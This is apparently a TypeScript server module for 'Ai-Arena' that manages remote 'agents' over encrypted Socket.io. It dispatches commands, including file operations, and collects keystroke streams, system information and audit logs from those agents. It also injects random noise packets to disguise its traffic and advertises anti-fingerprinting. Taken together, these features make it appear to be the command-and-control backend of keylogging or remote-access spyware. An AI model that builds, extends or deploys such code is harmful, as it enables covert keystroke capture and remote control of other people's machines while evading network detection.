/**
 * Ai-Arena — Socket.io Server Handler (Hardened)
 *
 * Manages all agent connections, command dispatch, and real-time data flow.
 * All messages are encrypted with AES-256-GCM via crypto.ts.
 * Includes: rate limiting, IP-based restrictions, noise heartbeat injection,
 * connection limits, anti-fingerprinting, and audit logging.
 */

import type { Server } from 'socket.io'
import { encrypt, decrypt, generateNoisePacket } from './crypto'

interface AgentConnection {
  id: string
  licenseKey: string
  socketId: string
  systemInfo: Record<string, unknown> | null
  platformInfo: Record<string, unknown> | null
  connectedAt: Date
  lastHeartbeat: Date
  ip: string
  messageCount: number
}

// In-memory store of connected agents (licenseKey -> connection)
const connectedAgents = new Map<string, AgentConnection>()
// Socket ID -> licenseKey mapping
const socketToLicense = new Map<string, string>()
// Pending command callbacks (commandId -> resolver)
const pendingCommands = new Map<string, {
  resolve: (data: unknown) => void
  reject: (err: Error) => void
  timeout: NodeJS.Timeout
}>()

// ─── Rate Limiting ───────────────────────────────────
const messageRateLimit = new Map<string, { count: number; resetTime: number }>()
const MAX_MESSAGES_PER_SECOND = 30
const CONNECTIONS_PER_IP = new Map<string, number>()
const MAX_CONNECTIONS_PER_IP = 5

function checkRateLimit(socketId: string): boolean {
  const now = Date.now()
  const entry = messageRateLimit.get(socketId)
  if (!entry || now > entry.resetTime) {
    messageRateLimit.set(socketId, { count: 1, resetTime: now + 1000 })
    return true
  }
  entry.count++
  return entry.count <= MAX_MESSAGES_PER_SECOND
}

function checkIpLimit(ip: string): boolean {
  const count = CONNECTIONS_PER_IP.get(ip) || 0
  return count < MAX_CONNECTIONS_PER_IP
}

export function getConnectedAgents(): Map<string, AgentConnection> {
  return connectedAgents
}

export function getAgentByLicenseKey(key: string): AgentConnection | undefined {
  return connectedAgents.get(key)
}

export function isAgentOnline(licenseKey: string): boolean {
  const agent = connectedAgents.get(licenseKey)
  if (!agent) return false
  // Consider agent offline if no heartbeat for 90 seconds
  const timeSinceHeartbeat = Date.now() - agent.lastHeartbeat.getTime()
  return timeSinceHeartbeat < 90000
}

export function sendCommandToAgent(licenseKey: string, command: Record<string, unknown>): Promise<unknown> {
  return new Promise((resolve, reject) => {
    const agent = connectedAgents.get(licenseKey)
    if (!agent) {
      reject(new Error('Agent is offline or not connected'))
      return
    }

    const commandId = `cmd_${Date.now()}_${Math.random().toString(36).substring(2, 8)}`
    const fullCommand = { ...command, id: commandId }

    // Set timeout (30s for most commands, 60s for file operations)
    const isFileOp = (command.type as string)?.startsWith('files:')
    const timeoutMs = isFileOp ? 60000 : 30000

    const timeout = setTimeout(() => {
      pendingCommands.delete(commandId)
      reject(new Error('Command timed out'))
    }, timeoutMs)

    pendingCommands.set(commandId, { resolve, reject, timeout })

    // The encrypted sending happens in the io wrapper
    sendToSocket(agent.socketId, { type: 'command', ...fullCommand })
  })
}

function sendToSocket(socketId: string, message: unknown) {
  // This is called from within the socket.io server context
  // The actual sending happens via the io reference passed to setupSocketHandler
  const io = (globalThis as unknown as { __arena_io?: Server }).__arena_io
  if (io) {
    const encrypted = encrypt(message)
    io.to(socketId).emit('data', encrypted)
  }
}

// Event handler callback type
type EventHandler = (licenseKey: string, data: unknown) => void
const eventHandlers = {
  heartbeat: [] as EventHandler[],
  status: [] as EventHandler[],
  keystrokes: [] as EventHandler[],
  audit: [] as EventHandler[],
  agentConnect: [] as EventHandler[],
  agentDisconnect: [] as EventHandler[],
}

export function onEvent(event: keyof typeof eventHandlers, handler: EventHandler) {
  if (eventHandlers[event]) {
    eventHandlers[event].push(handler)
  }
}

function emitEvent(event: keyof typeof eventHandlers, licenseKey: string, data: unknown) {
  const handlers = eventHandlers[event] || []
  for (const handler of handlers) {
    try {
      handler(licenseKey, data)
    } catch (e) {
      console.error(`[Socket] Event handler error (${event}):`, e)
    }
  }
}

export function setupSocketHandler(io: Server) {
  ;(globalThis as unknown as { __arena_io?: Server }).__arena_io = io

  // Connection middleware: IP-based limits only (auth handled via first 'data' event)
  io.use((socket, next) => {
    try {
      const ip = socket.handshake.address || 'unknown'

      // IP-based connection limit
      if (!checkIpLimit(ip)) {
        console.warn(`[Socket] Connection rejected: IP limit exceeded for ${ip}`)
        return next(new Error('Too many connections from this IP'))
      }

      // Track IP and mark socket as unauthenticated
      const sd = socket.data as { licenseKey?: string; ip: string; isAuthenticated: boolean }
      sd.ip = ip
      sd.isAuthenticated = false
      CONNECTIONS_PER_IP.set(ip, (CONNECTIONS_PER_IP.get(ip) || 0) + 1)

      next()
    } catch (e) {
      console.warn(`[Socket] Connection middleware error:`, e)
      next(new Error('Connection failed'))
    }
  })

  io.on('connection', (socket) => {
    const socketId = socket.id
    const sd = socket.data as { licenseKey?: string; ip: string; isAuthenticated: boolean }
    const ip = sd.ip || 'unknown'

    console.log(`[Socket] New connection: ${socketId} from ${ip} (awaiting auth)`)

    // Handle encrypted data from agent
    socket.on('data', (raw: string) => {
      try {
        // Rate limit per socket
        if (!checkRateLimit(socketId)) {
          console.warn(`[Socket] Rate limit exceeded for ${socketId}`)
          socket.disconnect(true)
          return
        }

        // --- First message must be auth ---
        if (!sd.isAuthenticated) {
          try {
            const authMsg = decrypt(raw) as { type: string; licenseKey?: string }
            if (authMsg.type !== 'auth' || !authMsg.licenseKey) {
              console.warn(`[Socket] Invalid auth from ${socketId}`)
              socket.disconnect(true)
              return
            }
            const licenseKey = authMsg.licenseKey

            // Check for duplicate agent connections (same license key already connected)
            const existing = connectedAgents.get(licenseKey)
            if (existing && existing.socketId !== socketId) {
              const oldSocket = io.sockets.sockets.get(existing.socketId)
              if (oldSocket) oldSocket.disconnect(true)
              connectedAgents.delete(licenseKey)
              socketToLicense.delete(existing.socketId)
            }

            // Register agent
            sd.licenseKey = licenseKey
            sd.isAuthenticated = true
            const agent: AgentConnection = {
              id: socketId,
              licenseKey,
              socketId,
              systemInfo: null,
              platformInfo: null,
              connectedAt: new Date(),
              lastHeartbeat: new Date(),
              ip,
              messageCount: 0,
            }
            connectedAgents.set(licenseKey, agent)
            socketToLicense.set(socketId, licenseKey)

            // Send auth confirmation
            const authResponse = encrypt({ type: 'auth:ok', message: 'Connected to Ai-Arena' })
            socket.emit('data', authResponse)

            console.log(`[Socket] Agent authenticated: ${licenseKey} (${socketId})`)
            emitEvent('agentConnect', licenseKey, { connectedAt: agent.connectedAt })
            return
          } catch (e) {
            console.warn(`[Socket] Auth failed from ${socketId}:`, e)
            socket.disconnect(true)
            return
          }
        }

        // --- Authenticated message handling ---
        const licenseKey = sd.licenseKey
        const message = decrypt(raw) as Record<string, string>

        // Silently drop noise packets (don't log them)
        if (message.type === '_noise') return

        // Track message count per agent
        const existingAgent = connectedAgents.get(licenseKey)
        if (existingAgent) {
          existingAgent.messageCount = (existingAgent.messageCount || 0) + 1
        }

        switch (message.type) {
          case 'heartbeat': {
            const existing = connectedAgents.get(licenseKey)
            if (existing) {
              existing.lastHeartbeat = new Date()
              if (message.systemInfo) {
                try {
                  existing.systemInfo = typeof message.systemInfo === 'string' ? JSON.parse(message.systemInfo) : message.systemInfo
                } catch { /* ignore */ }
              }
            }
            emitEvent('heartbeat', licenseKey, message.data)

            // Send noise response to normalize traffic patterns
            if (Math.random() > 0.5) {
              try {
                socket.emit('data', generateNoisePacket())
              } catch { /* ignore */ }
            }
            break
          }

          case 'result': {
            const commandId = message.id || message.commandId
            if (commandId) {
              const pending = pendingCommands.get(commandId)
              if (pending) {
                clearTimeout(pending.timeout)
                pendingCommands.delete(commandId)
                pending.resolve(message.data || message)
              }
            }
            break
          }

          case 'keystrokes': {
            emitEvent('keystrokes', licenseKey, message.data || message.entries)
            break
          }

          case 'audit': {
            emitEvent('audit', licenseKey, message.data || message.entries)
            break
          }

          case 'system:info': {
            const existing = connectedAgents.get(licenseKey)
            if (existing) {
              existing.systemInfo = (message.data || {}) as Record<string, unknown>
              existing.platformInfo = (message.platformInfo || {}) as Record<string, unknown>
            }
            break
          }

          default:
            console.log(`[Socket] Unknown message type from ${licenseKey}:`, message.type)
        }
      } catch (e) {
        console.error(`[Socket] Failed to decrypt message from ${socketId}:`, e)
      }
    })

    // Handle disconnect (hardened with IP cleanup)
    socket.on('disconnect', (reason) => {
      const lk = sd.licenseKey
      if (lk) {
        console.log(`[Socket] Agent disconnected: ${lk} (${reason})`)
        connectedAgents.delete(lk)
        socketToLicense.delete(socketId)
        emitEvent('agentDisconnect', lk, { reason, disconnectedAt: new Date() })
      } else {
        console.log(`[Socket] Unauthenticated client disconnected: ${socketId} (${reason})`)
      }
      messageRateLimit.delete(socketId)

      // Decrement IP connection count
      const ipCount = CONNECTIONS_PER_IP.get(ip) || 0
      if (ipCount <= 1) CONNECTIONS_PER_IP.delete(ip)
      else CONNECTIONS_PER_IP.set(ip, ipCount - 1)

      // Reject all pending commands for this agent
      for (const [cmdId, pending] of pendingCommands) {
        pendingCommands.delete(cmdId)
        clearTimeout(pending.timeout)
        pending.reject(new Error('Agent disconnected'))
      }
    })

    socket.on('error', (err) => {
      console.error(`[Socket] Error from ${sd.licenseKey || socketId}:`, err.message)
    })
  })

  // Periodic noise injection to maintain constant traffic pattern
  setInterval(() => {
    const sockets = Array.from(io.sockets.sockets.values())
    for (const sock of sockets) {
      try {
        if (sock.connected && Math.random() > 0.7) {
          sock.emit('data', generateNoisePacket())
        }
      } catch { /* ignore */ }
    }
  }, 15000 + Math.random() * 10000) // Every 15-25 seconds randomly

  // Periodic dead connection cleanup
  setInterval(() => {
    const now = Date.now()
    for (const [key, agent] of connectedAgents) {
      const timeSince = now - agent.lastHeartbeat.getTime()
      if (timeSince > 120000) { // 2 minutes without heartbeat
        const sock = io.sockets.sockets.get(agent.socketId)
        if (sock) {
          console.log(`[Socket] Dead connection cleanup: ${key} (${Math.round(timeSince / 1000)}s without heartbeat)`)
          sock.disconnect(true)
        }
        connectedAgents.delete(key)
        socketToLicense.delete(agent.socketId)
        emitEvent('agentDisconnect', key, { reason: 'heartbeat_timeout', disconnectedAt: new Date() })
      }
    }
  }, 30000) // Check every 30 seconds

  console.log('[Socket] Ai-Arena WebSocket handler initialized (hardened)')
}
